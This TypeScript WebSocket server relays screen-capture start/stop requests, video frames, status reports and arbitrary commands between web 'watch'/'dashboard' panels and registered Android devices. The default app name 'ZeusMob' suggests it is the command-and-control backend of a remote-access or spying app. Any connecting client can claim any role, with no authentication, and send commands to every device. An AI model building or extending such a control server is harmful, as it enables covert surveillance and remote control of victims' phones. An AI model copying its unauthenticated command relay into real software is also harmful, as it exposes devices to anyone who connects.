import { IncomingMessage } from "http";
import { WebSocketServer, WebSocket } from "ws";
import { logger } from "../lib/logger.js";

interface WsClient {
  ws: WebSocket;
  role: string;
  deviceId?: string;
  ip: string;
}

interface DeviceEntry {
  deviceId: string;
  ip: string;
  app: string;
  online: boolean;
  lastSeen: number;
}

const clients        = new Set<WsClient>();
const deviceRegistry = new Map<string, DeviceEntry>();

function broadcastDeviceList() {
  const devices = [...deviceRegistry.values()];
  const msg = JSON.stringify({ type: "device_list", devices });
  for (const c of clients) {
    if (
      (c.role === "dashboard" || c.role === "status") &&
      c.ws.readyState === WebSocket.OPEN
    ) {
      c.ws.send(msg);
    }
  }
}

/** Forward a message to the matching device client */
function relayToDevice(targetDeviceId: string | undefined, payload: string) {
  let count = 0;
  for (const c of clients) {
    if (
      c.role === "device" &&
      c.ws.readyState === WebSocket.OPEN &&
      (!targetDeviceId || c.deviceId === targetDeviceId)
    ) {
      c.ws.send(payload);
      count++;
    }
  }
  return count;
}

export function createWsServer(server: import("http").Server): WebSocketServer {
  const wss = new WebSocketServer({ server, path: undefined });

  wss.on("connection", (ws: WebSocket, req: IncomingMessage) => {
    const url      = new URL(req.url ?? "/", "http://localhost");
    const role     = url.searchParams.get("role") ?? "unknown";
    const deviceId = url.searchParams.get("deviceId") ?? undefined;
    const ip = (
      (req.headers["x-forwarded-for"] as string | undefined)?.split(",")[0].trim()
      ?? req.socket.remoteAddress
      ?? "unknown"
    );

    logger.info({ role, deviceId, ip }, `WS connected from ${ip}`);

    const client: WsClient = { ws, role, deviceId, ip };
    clients.add(client);

    ws.send(JSON.stringify({ type: "welcome", role, deviceId }));

    if (role === "dashboard" || role === "status") {
      ws.send(JSON.stringify({ type: "device_list", devices: [...deviceRegistry.values()] }));
    }

    ws.on("message", (raw) => {
      // ── Binary frame from device → relay to all watchers ──────────
      let msg: Record<string, unknown>;
      try {
        msg = JSON.parse(raw.toString()) as Record<string, unknown>;
      } catch {
        if (deviceId && role === "device") {
          for (const c of clients) {
            if (
              c.role === "watch" &&
              c.deviceId === deviceId &&
              c.ws.readyState === WebSocket.OPEN
            ) {
              c.ws.send(raw);
            }
          }
        }
        return;
      }

      const evtType = ((msg.type ?? msg.event) as string | undefined) ?? "";

      // ── Device registration ────────────────────────────────────────
      if (evtType === "device_online") {
        const devId = (msg.deviceId as string | undefined) ?? deviceId ?? ip;
        deviceRegistry.set(devId, {
          deviceId: devId,
          ip,
          app:      (msg.app as string | undefined) ?? "ZeusMob",
          online:   true,
          lastSeen: Date.now(),
        });
        logger.info({ devId, ip }, "Device ONLINE");
        broadcastDeviceList();
        ws.send(JSON.stringify({ type: "device_registered", deviceId: devId }));
        return;
      }

      // ── Stream control: relay to device + ack to watcher ──────────
      // THIS IS THE KEY FIX: start_stream / stop_stream must reach the Android device
      if (evtType === "start_stream" || evtType === "stop_stream") {
        const targetId = (msg.deviceId ?? msg.targetDeviceId) as string | undefined;

        if (role === "watch" || role === "dashboard") {
          // Relay to the Android device so it starts/stops capturing
          const relayed = relayToDevice(targetId, JSON.stringify(msg));
          logger.info({ evtType, targetId, relayed }, `${evtType} relayed to ${relayed} device(s)`);
          // Ack back to the web panel
          ws.send(JSON.stringify({
            type:     "stream_ack",
            status:   evtType === "start_stream" ? "started" : "stopped",
            deviceId: targetId,
          }));
        }

        // If the device itself echoes back, relay stats/ack to watchers
        if (role === "device" && deviceId) {
          for (const c of clients) {
            if (c.role === "watch" && c.deviceId === deviceId && c.ws.readyState === WebSocket.OPEN) {
              c.ws.send(JSON.stringify(msg));
            }
          }
        }
        return;
      }

      // ── JSON frame relay (device → watchers) ──────────────────────
      if (evtType === "frame" && role === "device" && deviceId) {
        for (const c of clients) {
          if (c.role === "watch" && c.deviceId === deviceId && c.ws.readyState === WebSocket.OPEN) {
            c.ws.send(raw);
          }
        }
        return;
      }

      // ── Command relay (watcher → device) ──────────────────────────
      if (evtType === "command") {
        const targetId = (msg.targetDeviceId ?? msg.deviceId) as string | undefined;
        const relayed  = relayToDevice(targetId, JSON.stringify(msg));
        logger.info({ cmd: msg.cmd, targetId, relayed }, "Command relayed");
        ws.send(JSON.stringify({ type: "command_ack", cmd: msg.cmd, ok: true }));
        return;
      }

      // ── Status report (device → watchers) ─────────────────────────
      if (evtType === "status_report" && role === "device" && deviceId) {
        for (const c of clients) {
          if (c.role === "watch" && c.deviceId === deviceId && c.ws.readyState === WebSocket.OPEN) {
            c.ws.send(JSON.stringify(msg));
          }
        }
        return;
      }

      // ── Stats ping from device → watchers ─────────────────────────
      if (evtType === "stats" && role === "device" && deviceId) {
        for (const c of clients) {
          if (c.role === "watch" && c.deviceId === deviceId && c.ws.readyState === WebSocket.OPEN) {
            c.ws.send(JSON.stringify(msg));
          }
        }
        return;
      }
    });

    ws.on("close", () => {
      clients.delete(client);
      logger.info({ role, deviceId, ip }, "WS disconnected");
      if (deviceId && role === "device") {
        const entry = deviceRegistry.get(deviceId);
        if (entry) {
          entry.online   = false;
          entry.lastSeen = Date.now();
          broadcastDeviceList();
        }
      }
    });

    ws.on("error", (err) => logger.error({ err, role, deviceId }, "WS error"));
  });

  // Heartbeat every 5 s
  setInterval(() => {
    broadcastDeviceList();
  }, 5000);

  return wss;
}
